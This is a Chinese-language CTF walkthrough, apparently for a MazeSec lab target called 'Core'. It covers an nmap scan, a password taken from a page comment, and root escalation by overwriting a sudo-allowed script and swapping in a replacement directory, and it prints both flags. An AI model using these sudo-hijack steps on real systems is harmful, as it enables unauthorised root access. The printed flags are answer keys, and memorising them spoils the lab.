---
title: "Core"
date: "2026-08-12T00:00:00+08:00"
lastmod: "2026-08-12T00:00:00+08:00"
slug: "Core_lily2663"
summary: "Core"
tags:
  - "Shell"
params:
  protected: false
  commentId: "Core_lily2663"
  legacyId: "Core_lily2663"
---


# Core

# 端口扫描

nmap

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap -A 192.168.1.29
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 14:08 +0800
Nmap scan report for 192.168.1.29
Host is up (0.0015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Unix))
|_http-server-header: Apache/2.4.67 (Unix)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: MazeSec \xE9\x9D\xB6\xE6\x9C\xBA\xE6\xB5\x8B\xE8\xAF\x95\xE5\x9B\xA2\xE9\x98\x9F\xE2\x80\x94\xE5\xB9\x95\xE5\x90\x8E\xE8\x8B\xB1\xE9\x9B\x84
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=8/12%OT=22%CT=1%CU=34975%PV=Y%DS=2%DC=T%G=Y%TM=6A7C0DF
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=20)SE
OS:Q(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=104%GCD=1%ISR=107%TI=
OS:Z%CI=Z%TS=21)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=21)SEQ(SP=106%GCD=1%I
OS:SR=109%TI=Z%CI=Z%II=I%TS=22)OPS(O1=M5B4ST11NW9%O2=M5B4ST11NW9%O3=M5B4NNT
OS:11NW9%O4=M5B4ST11NW9%O5=M5B4ST11NW9%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=F
OS:E88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW9%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=883B%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=88
OS:55%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=8861%RU
OS:D=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=887B%RUD=G)U
OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=8885%RUD=G)IE(R=Y
OS:%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.23 ms LAPTOP-L8P806AH.mshome.net (172.22.64.1)
2   3.12 ms 192.168.1.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds
```

# USERFLAG

80源码发现：

```
<!-- WJBCDJ1k36gYWKs9GjkS -->
```

这个就是对应用户的密码：

```bash
__      _____| | ___ ___  _ __ ___   ___
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

ll104567@Core:~$ ls
12138.sh  user.txt
ll104567@Core:~$ cat user.txt
flag{user-10ccf8c4b05e437def737342f1d9b33f}
ll104567@Core:~$

```



# ROOTFLAG

```bash
ll104567@Core:~$ cat 12138.sh
#!/bin/bash
echo "=== $(id) ==="
ls -la /home/111/
ls -la /home/111/111/
stat /home/111/111 /home/111/111/111.sh 2>&1
echo "--- content ---"
cat /home/111/111/111.sh 2>&1
echo "--- writable test ---"
touch /home/111/111/test_write 2>&1 && echo WRITABLE_DIR && rm -f /home/111/111/test_write
test -w /home/111/111/111.sh && echo FILE_WRITABLE || echo FILE_NOT_WRITABLE
test -O /home/111/111/111.sh && echo FILE_OWNED_BY_111 || echo FILE_NOT_OWNED
ll104567@Core:~$
```

直接运行

```bash
ll104567@Core:~$ ./12138.sh
=== uid=1000(ll104567) gid=1000(ll104567) groups=1000(ll104567) ===
ls: /home/111/111/: Permission denied
/home/111/:
ls: can't open '/home/111/': Permission denied
total 0
--- .ssh ---
ls: /home/111/.ssh: Permission denied
cat: can't open '/home/111/.ssh/*': Permission denied
--- mysql dir ---
ls: can't open '/var/lib/mysql/': Permission denied
total 0
--- getcap as 111 ---
--- suid as 111 ---
/bin/umount
/bin/bbsuid
/bin/mount
/usr/bin/expiry
/usr/bin/chsh
/usr/bin/chage
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
--- sudo -l -U root ---
Sorry, user ll104567 is not allowed to execute 'list' as root on Core.
--- sudo -l -U ll104567 ---
Matching Defaults entries for ll104567 on Core:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ll104567:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ll104567 may run the following commands on Core:
    (111) NOPASSWD: /home/ll104567/12138.sh
ll104567@Core:~$
```

发现

```bash
User ll104567 may run the following commands on Core:
    (111) NOPASSWD: /home/ll104567/12138.sh   //允许111免密使用
```

可以写，直接改，然后111身份执行脚本

```bash
ll104567@Core:~$ echo '/bin/bash' > /home/ll104567/12138.sh
ll104567@Core:~$ sudo -u 111 /home/ll104567/12138.sh
111@Core:/home/ll104567$
```

进入111了

```bash
111@Core:~/111$ ls -la
total 12
drwxr-xr-x    2 root     root          4096 Aug 11 16:06 .
drwx------    3 111      111           4096 Aug 11 15:42 ..
-rwxr-xr-x    1 root     root            99 Aug 11 16:06 111.sh
```

发现不可以直接改了，

搜集信息看

```bash
111@Core:~/111$ sudo -l
Matching Defaults entries for 111 on Core:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for 111:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User 111 may run the following commands on Core:
    (ALL : ALL) NOPASSWD: /home/111/111/111.sh
```

111可免密执行/home/111/111/111.sh

```bash
mv /home/111/111 /home/111/111_2
```

重命名这个目录的父目录，然后自己建一个同名的目录，新建提权脚本：

```bash
111@Core:~/111$ echo '/bin/bash' >> /home/111/111/111.sh
111@Core:~/111$ chmod +x /home/111/111/111.sh
111@Core:~/111$ sudo /home/111/111/111.sh
```

root，拿到flag

```bash
root@Core:~# cat root.txt
flag{root-dfb18999777ea8a3177050c859c98c04}
```



# 总结

靶机简单考察了权限管理不当，体现在其信任目录范围过大和关键脚本权限分配失误。